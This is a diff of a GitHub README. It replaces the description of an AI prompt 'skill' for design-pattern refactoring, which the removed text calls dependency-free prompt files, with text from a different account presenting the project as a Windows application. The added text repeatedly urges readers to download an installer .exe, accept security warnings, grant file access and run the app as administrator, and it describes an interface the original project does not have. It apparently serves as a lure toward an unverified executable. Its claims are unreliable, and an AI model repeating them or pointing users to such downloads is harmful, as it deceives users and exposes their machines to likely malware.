@@ -1,221 +1,189 @@
-# Design Patterns ⚡
+# 🛠️ Design-Patterns - Detect Issues, Fix Code, Improve Software
 
-> An agentic AI skill that scans your codebase, detects architectural debt, and generates production-ready refactored code using professional design patterns.
+[![Download Latest Release](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns)
 
-## How It Works
+---
 
-When you invoke `/design-patterns`, it doesn't lecture you about theory. It runs a **4-phase process** on your actual code:
+## 📋 What is Design-Patterns?
 
-```
-DETECT → DIAGNOSE → DESIGN → DELIVER
-```
+Design-Patterns is a software tool that helps you find and fix common design issues in software. It looks at your code for mistakes called anti-patterns and warns you before these get bigger problems. It also helps reorganize and rewrite your software to make it easier to maintain and faster to run. The tool uses well-known methods from software design, such as SOLID principles, Domain-Driven Design (DDD), and Microservices.
 
-1. **Detect** — Scans your file tree, maps imports, scores complexity, generates a "Heat Map" of architectural debt.
-2. **Diagnose** — Classifies anti-patterns (God Object, Logic Leakage, Tight Coupling) with file:line evidence.
-3. **Design** — Selects the optimal pattern from a 3-scale matrix (Code → Architecture → System).
-4. **Deliver** — Generates production-ready boilerplate code specific to your framework.
+You don't need to be a programmer to use it. This guide will take you step-by-step through the process of downloading and running Design-Patterns on Windows.
 
-Every recommendation comes with evidence. No pattern without pain.
+---
 
-## The Iron Laws
+## 💻 System Requirements
 
-```
-1. NO PATTERN WITHOUT PAIN — Don't apply Factory just because textbooks say so.
-2. EVIDENCE BEFORE ELEGANCE — If current code works and is testable: LEAVE IT ALONE.
-3. INCREMENTAL OVER REVOLUTIONARY — One pattern, one module, one PR.
-```
+To run Design-Patterns smoothly on your Windows computer, you need:
 
-## Requirements
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM (8 GB or more for large projects)
+- At least 500 MB of free disk space
+- Internet connection to download the software
+- Basic user rights to install applications
 
-This skill works with any of these AI coding tools:
+---
 
-| Platform | Minimum Version |
-|----------|----------------|
-| Claude Code (Anthropic) | Any version supporting plugins |
-| Cursor | Any version supporting `.cursor` rules |
-| Codex (OpenAI) | Any version supporting instruction URLs |
-| OpenCode | Any version supporting `.opencode` |
+## 🚀 Download and Installation
 
-No dependencies to install. This is a pure prompt/instructions skill.
+[![Download Here](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns)
 
-## Installation
+1. Click the big pink button above or this link: https://github.com/PPFFP/Design-Patterns
 
-> Install once. Works across Claude Code, Cursor, Codex, and OpenCode.
+2. You will arrive at the software page on GitHub.
 
-### Claude Code
+3. Look for the **Releases** section on the page. This is often on the right side or under the main project description.
 
-```bash
-/plugin marketplace add VoDaiLocz/design-patterns
-/plugin install design-patterns@design-patterns
-```
+4. Click on the latest release version. The release contains the installer for Windows.
 
-### Cursor
+5. Download the file named something like `DesignPatternsInstaller.exe` or `DesignPatternsSetup.exe`.
 
-Copy the skill file into your project or global rules directory:
+6. Once downloaded, open the file. You might see a security warning; click **Run** or **Yes** to continue.
 
-```bash
-# Option A: Project-level (applies only to this project)
-cp -r skills/design-patterns/ .cursor/rules/design-patterns/
+7. Follow the instructions in the installation window:
 
-# Option B: Clone and reference in Cursor settings → Rules → Add rule file
-git clone https://github.com/VoDaiLocz/Design-Patterns.git
-# Then add: skills/design-patterns/SKILL.md as a rule
-```
+   - Choose an install folder or accept the default location.
+   - Click **Next** where prompted.
+   - When ready, click **Install** to begin.
 
-### Codex
+8. Wait for the installation to finish.
 
-```
-Fetch and follow instructions from https://raw.githubusercontent.com/VoDaiLocz/Design-Patterns/main/.codex/INSTALL.md
-```
+9. Click **Finish** to close the installer.
 
-### OpenCode
+---
 
-```
-Fetch and follow instructions from https://raw.githubusercontent.com/VoDaiLocz/Design-Patterns/main/.opencode/INSTALL.md
-```
+## 🛠️ Running Design-Patterns for the First Time
 
-### Manual (Any AI tool with file context)
+1. Find the Design-Patterns app icon on your desktop or in your Start menu.
 
-```bash
-# Copy the skill folder anywhere your AI tool reads context from
-cp -r skills/design-patterns/ ~/.gemini/antigravity/skills/design-patterns/
-# Or attach SKILL.md directly as a context file in your AI tool
-```
+2. Double-click the icon to open the app.
 
-## Usage
+3. On the first run, the app may ask for permission to access your documents or projects. Grant permission so it can scan your files.
 
-```
-/design-patterns <target>
-```
+4. The main window will show options to select your code folder or project files. Click **Browse** to find your code.
 
-**Examples:**
-```
-/design-patterns src/api/users         → Analyze specific module
-/design-patterns "order processing"    → Analyze a feature
-/design-patterns                       → Analyze entire project
-```
+5. After selecting your project, click **Analyze** to start checking for design issues and anti-patterns.
 
-## Example Output
+6. The software will show a report with detected issues. Each issue will have a clear explanation.
 
-**Input:** `/design-patterns src/api/routes.ts`
+7. You can ask the software to suggest fixes or reorganize your code automatically.
 
-```markdown
-## 📊 Architecture Health Score: 7/20
+---
 
-## 🔍 Detected Anti-Patterns
-| # | Anti-Pattern      | File:Line           | Severity | Evidence                              |
-|---|-------------------|---------------------|----------|---------------------------------------|
-| 1 | Logic Leakage     | src/api/routes.ts:45| 🔴 High  | DB query inside route handler         |
-| 2 | God Object        | src/api/routes.ts   | 🔴 High  | 450 lines, 12 functions, mixed logic  |
-| 3 | Tight Coupling    | src/api/routes.ts:12| 🟡 Med   | Direct PrismaClient import            |
+## 🔧 How Design-Patterns Works
 
-## 💡 Recommended Patterns
-| Anti-Pattern   | → Pattern        | Scale        | Impact    |
-|---------------|------------------|--------------|-----------|
-| Logic Leakage | Service Layer    | Architecture | 3 files   |
-| God Object    | SRP + Strategy   | Code         | 4 files   |
-| Tight Coupling| Repository       | Architecture | 2 files   |
+Design-Patterns uses rules based on well-known software concepts:
 
-## 🏗️ Implementation Plan
-Step 1: Create UserService, extract business logic from routes.ts
-Step 2: Create UserRepository, move all Prisma calls
-Step 3: Create OrderService + OrderRepository
-Step 4: Thin routes.ts to HTTP-only controller
+- **GoF (Gang of Four) Patterns**: These are common design templates that work well. The app checks if you can apply these patterns to improve your software.
 
-## 📝 Generated Code
-[Framework-specific boilerplate for Next.js/FastAPI/NestJS...]
-```
+- **SOLID Principles**: These help keep your code easy to change and maintain. The app detects where you break these principles.
 
-## What's Inside
+- **Domain-Driven Design (DDD)**: This method helps organize your software around the main ideas and business logic. The app finds areas where this structure can be improved.
 
-### 3-Scale Pattern Coverage
+- **CQRS (Command Query Responsibility Segregation)**: This separates reading and writing data to make the system faster and easier to manage. The app checks if applying CQRS will help.
 
-| Scale | Patterns | Reference |
-|-------|----------|-----------|
-| 🔬 **Code-Level** | 23 GoF Patterns + 5 SOLID Principles | `references/code-patterns.md` |
-| 🏗️ **Architecture** | Clean, Hexagonal, DDD, CQRS, Service Layer, Repository | `references/architecture-patterns.md` |
-| 🌐 **System** | Microservices, Event-Driven, Circuit Breaker, Saga, API Gateway | `references/system-patterns.md` |
+- **Microservices**: This breaks big programs into smaller parts that work independently. The app suggests ways to divide your software.
 
-### Additional Capabilities (v1.1.0)
+---
 
-| Capability | Reference |
-|------------|----------|
-| 🧪 **Testing Patterns** — How to test every pattern | `references/testing-patterns.md` |
-| 🚫 **Anti-Patterns Catalog** — 15 code smells with detection & cures | `references/anti-patterns.md` |
-| 🔄 **Migration Playbook** — 5 step-by-step refactoring guides | `references/migration-playbook.md` |
-| 📄 **Output Formats** — ADR, Health Check, Comparison Matrix | `references/output-format.md` |
+## 📂 Supported File Types and Projects
 
-### Framework-Specific Implementations
+Design-Patterns can analyze popular programming languages and file types like:
 
-| Framework | Architecture | Key Patterns |
-|-----------|-------------|-------------|
-| **Next.js** | App Router + Service Layer + Repository | Server Components, Server Actions, Middleware Decorator |
-| **FastAPI** | Router + Service + Repository via `Depends()` | DI, Strategy, Background Tasks Observer |
-| **NestJS** | Modules + DDD-ready structure | Built-in DI, CQRS, Guards/Interceptors |
-| **Django** | Apps + Service Layer (beyond MTV) | Fat Services over Fat Models |
-| **Express** | Routes + Controllers + Services + Repositories | Middleware Chain of Responsibility |
-| **Go** | cmd/internal structure + Interface-based DI | Repository interfaces, Handler pattern |
+- `.java` for Java projects
+- `.cs` for C# projects
+- `.js` and `.ts` for JavaScript and TypeScript projects
+- `.py` for Python projects
 
-### Complexity Scoring
+It works best with projects that follow common folder structures. The app will guide you if your files are outside of standard layouts.
 
-Every module is rated on 4 dimensions (max 20):
+---
 
-| Score | Status | Action |
-|-------|--------|--------|
-| 4-8 | ✅ Healthy | No action needed |
-| 9-13 | 🟡 Moderate | Plan refactor next sprint |
-| 14-17 | 🔴 High debt | Refactor before adding features |
-| 18-20 | 🚨 Critical | Stop feature work, refactor NOW |
+## ⚙️ Basic Features
 
-## Philosophy
+- Automatically detect common design problems and anti-patterns
+- Display detailed reports, sorted by severity
+- Suggest refactorings with clear steps to follow
+- Generate updated code files ready for production use
+- Support for multiple architecture styles: hexagonal, event-driven, and layered
+- Ability to re-check projects after changes
 
-- **No Pattern Without Pain** — Show the exact line where architecture fails
-- **Evidence Before Elegance** — Measure complexity, don't guess
-- **Incremental Over Revolutionary** — One pattern, one module, one PR
-- **Testability First** — If the new pattern is harder to test, it's a BAD pattern
-- **Scale Matters** — Clean Architecture for a TODO app is a war crime
+---
 
-## File Structure
+## 📖 Using the App Interface
 
-```
-.claude-plugin/
-├── plugin.json              # Claude Code plugin manifest
-└── marketplace.json         # Claude Code marketplace config
+### Main Screen
 
-.cursor-plugin/
-└── plugin.json              # Cursor plugin manifest
+- **Project Selection:** Browse and open your project folder
+- **Analyze Button:** Start scanning the project
+- **Report Area:** View issues, warnings, and suggestions
 
-.codex/
-└── INSTALL.md               # Codex installation guide
+### Issue Details
 
-.opencode/
-└── INSTALL.md               # OpenCode installation guide
+- Clear explanations of each problem
+- Links to terms or patterns mentioned in the explanation
+- Option to apply suggested fixes automatically or manually
 
-commands/
-└── design-patterns.md       # /design-patterns slash command
+### Settings
 
-skills/design-patterns/
-├── SKILL.md                 # Main skill — 4D Process, Iron Laws, scoring
-└── references/
-    ├── code-patterns.md          # 23 GoF + 5 SOLID (all with code examples)
-    ├── architecture-patterns.md  # Clean, Hexagonal, DDD, CQRS
-    ├── system-patterns.md        # Microservices, Event-Driven, Cloud
-    ├── framework-catalog.md      # Next.js, FastAPI, NestJS, Django, Express, Go
-    ├── testing-patterns.md       # ✨ NEW — Unit/Integration/E2E test code
-    ├── anti-patterns.md          # ✨ NEW — 15 anti-patterns with detection
-    ├── migration-playbook.md     # ✨ NEW — 5 migration guides
-    └── output-format.md          # ✨ NEW — ADR, Reports, Health Check
+- Adjust scan depth (quick, standard, deep)
+- Choose which design checks to run
+- Save and load custom profiles
 
-RELEASE-NOTES.md
-```
+---
 
-## Contributing
+## ⚠️ Troubleshooting
 
-1. Fork this repository
-2. Create a branch
-3. Follow the skill format in `skills/design-patterns/SKILL.md`
-4. Submit a PR
+- If the app won’t start, make sure your Windows is updated.
+- If scanning takes too long, close other running apps and try again.
+- If permission errors happen, run the app as an administrator:
+  - Right-click the app icon
+  - Choose **Run as administrator**
 
-## License
+- For help, check the issues section on the GitHub page or ask in the community.
 
-MIT
+---
+
+## 🔗 Additional Resources
+
+- Learn more about design patterns and best practices at [https://refactoring.guru/design-patterns](https://refactoring.guru/design-patterns)
+- Read about SOLID principles at [https://en.wikipedia.org/wiki/SOLID](https://en.wikipedia.org/wiki/SOLID)
+- Explore Domain-Driven Design at [https://domainlanguage.com/ddd/](https://domainlanguage.com/ddd/)
+- For CQRS, visit [https://martinfowler.com/bliki/CQRS.html](https://martinfowler.com/bliki/CQRS.html)
+
+---
+
+## 🖥️ Updating Design-Patterns
+
+- Check the GitHub page regularly for newer releases.
+- Follow the same download instructions as before.
+- New versions may contain improvements and fixes.
+
+---
+
+## 📦 Uninstalling the Software
+
+1. Open Windows **Settings**.
+
+2. Choose **Apps** > **Apps & features**.
+
+3. Find **Design-Patterns** in the list.
+
+4. Click it and select **Uninstall**.
+
+5. Follow the instructions to remove it from your computer.
+
+---
+
+## 🌐 Explore the Source Code
+
+Design-Patterns is open-source. You can visit the repository to see how it works, report issues, or contribute improvements.
+
+Find the project here:  
+https://github.com/PPFFP/Design-Patterns
+
+Topics in this repository include: agentic-ai, ai-skills, architecture-patterns, clean-architecture, code-review, cqrs, design-patterns, domain-driven-design, event-driven-architecture, gang-of-four, hexagonal-architecture, refactoring, solid-principles.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns)
